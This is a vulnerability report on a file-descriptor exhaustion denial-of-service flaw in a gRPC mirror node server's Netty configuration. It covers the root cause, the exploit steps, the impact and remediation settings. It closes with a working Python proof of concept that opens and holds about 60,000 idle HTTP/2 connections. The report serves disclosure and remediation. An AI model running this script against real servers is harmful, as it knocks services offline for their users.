### Title
Unbounded TCP Connection Acceptance in `grpcServerConfigurer` Enables File Descriptor Exhaustion DoS

### Summary
`grpcServerConfigurer()` configures the Netty gRPC server with only `maxConcurrentCallsPerConnection`, which limits RPC calls per connection but places no bound on the total number of accepted TCP connections. Any unprivileged network-reachable attacker can open an unbounded number of idle TCP connections, exhausting the JVM process's file descriptor table and preventing all new connections including Kubernetes liveness/readiness health check probes.

### Finding Description
**Code path:** `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35. The lambda passed to `ServerBuilderCustomizer<NettyServerBuilder>` calls exactly two methods on `serverBuilder`:

```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // default: 5
```

`NettyServerBuilder` exposes `maxConnectionAge(Duration, TimeUnit)`, `maxConnectionIdle(Duration, TimeUnit)`, and (via the underlying Netty channel option) a channel-level connection count limit — none of which are set here. A grep across the entire Java source tree confirms zero calls to `maxConnections`, `maxConnectionAge`, or `maxConnectionIdle` anywhere in the project.

**Root cause / failed assumption:** The configuration assumes that limiting concurrent *calls* per connection (5) is sufficient to bound resource consumption. It is not. Each TCP connection accepted by Netty consumes one file descriptor regardless of whether any RPC call is ever made on it. An attacker who opens connections and sends the HTTP/2 client preface (to complete the gRPC handshake) but never issues an RPC will hold open file descriptors indefinitely while consuming almost no server-side CPU.

**Exploit flow:**
1. Attacker opens a TCP connection to port 5600 and sends the HTTP/2 client preface (`PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n` + SETTINGS frame). The server completes the HTTP/2 handshake and allocates a Netty `Channel` + file descriptor.
2. Attacker sends no further frames. The connection is idle; no RPC call is made, so `maxConcurrentCallsPerConnection` is never evaluated.
3. Attacker repeats at high rate from one or more source IPs. A single Linux host can open ~65 000 simultaneous TCP connections.
4. The JVM process's open-file limit (typically 65 536 in containerised deployments) is reached. `accept()` returns `EMFILE`; Netty logs the error and stops accepting new connections.
5. Health check probes (gRPC or HTTP) that require a new TCP connection fail. Kubernetes marks the pod `NotReady` and removes it from the `Service` endpoints, completing the denial of service.

**Why existing checks are insufficient:**
- `maxConcurrentCallsPerConnection = 5` is a per-connection RPC call limit; it is evaluated only after a call arrives, not at connection acceptance time.
- The `GrpcHighFileDescriptors` Prometheus alert (`process_files_open_files / process_files_max_files > 0.8`, `for: 5m`) is reactive and fires only after 5 minutes at 80% utilisation — by which point the FD table may already be full and health checks already failing.
- No network-layer rate limiting or IP-based connection throttling is configured in the Helm chart ingress or service definitions.

### Impact Explanation
Complete denial of service for the gRPC mirror node API (port 5600). All topic subscription streams (`subscribeTopic`, `getAddressBook`) become unreachable. Kubernetes liveness/readiness probes fail, causing the pod to be evicted and restarted — but the attacker can immediately re-exhaust the replacement pod. The attack is amplified in partition-recovery scenarios where the server is simultaneously trying to send GOAWAY frames to stale connections while accepting new attacker connections, but the partition scenario is not a prerequisite. Severity: **High** (availability impact, no authentication required, no rate limit).

### Likelihood Explanation
The gRPC port (5600) is publicly exposed in the default Helm chart configuration. The attack requires only the ability to open TCP connections — no credentials, no protocol knowledge beyond the 24-byte HTTP/2 client preface. It is repeatable, scriptable with standard tools (`hping3`, `wrk`, or a trivial Go/Python client), and can be executed from a single host. The 5-minute alert window means the service can be taken down and kept down before any automated remediation fires.

### Recommendation
Apply the following changes to `grpcServerConfigurer()` in `GrpcConfiguration.java` and expose the values as configurable `NettyProperties` fields:

1. **Set `maxConnectionAge`** (e.g., 5 minutes): forces periodic connection recycling, bounding the lifetime of any idle attacker connection.
2. **Set `maxConnectionIdle`** (e.g., 30 seconds): closes connections on which no RPC has been received within the idle window, evicting attacker connections that never send an RPC.
3. **Set `maxConnectionAgeGrace`** (e.g., 5 seconds): limits the GOAWAY drain window.
4. **Set `keepAliveTimeout`** (e.g., 20 seconds): closes connections that do not respond to HTTP/2 PING frames.

Example addition to the lambda:
```java
serverBuilder.maxConnectionAge(nettyProperties.getMaxConnectionAge().toSeconds(), TimeUnit.SECONDS);
serverBuilder.maxConnectionIdle(nettyProperties.getMaxConnectionIdle().toSeconds(), TimeUnit.SECONDS);
serverBuilder.maxConnectionAgeGrace(nettyProperties.getMaxConnectionAgeGrace().toSeconds(), TimeUnit.SECONDS);
serverBuilder.keepAliveTimeout(nettyProperties.getKeepAliveTimeout().toSeconds(), TimeUnit.SECONDS);
```

Additionally, configure an ingress/load-balancer-level connection rate limit per source IP to prevent the FD table from being filled before idle timeouts fire.

### Proof of Concept
```python
# Requires: Python 3, h2 library (pip install h2)
import socket, h2.connection, h2.config, time

TARGET = ("grpc.mirror.example.com", 5600)
sockets = []

config = h2.config.H2Configuration(client_side=True)

for i in range(60000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(TARGET)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    s.sendall(conn.data_to_send(65535))  # send client preface + SETTINGS
    sockets.append(s)
    if i % 1000 == 0:
        print(f"Opened {i} connections")

print("Holding connections open — server FD table should now be exhausted")
time.sleep(3600)
```
Run this script; after ~65 000 connections the gRPC server will stop accepting new connections. Kubernetes health check probes will begin failing within the next probe interval (default 10 s), and the pod will be marked `NotReady`.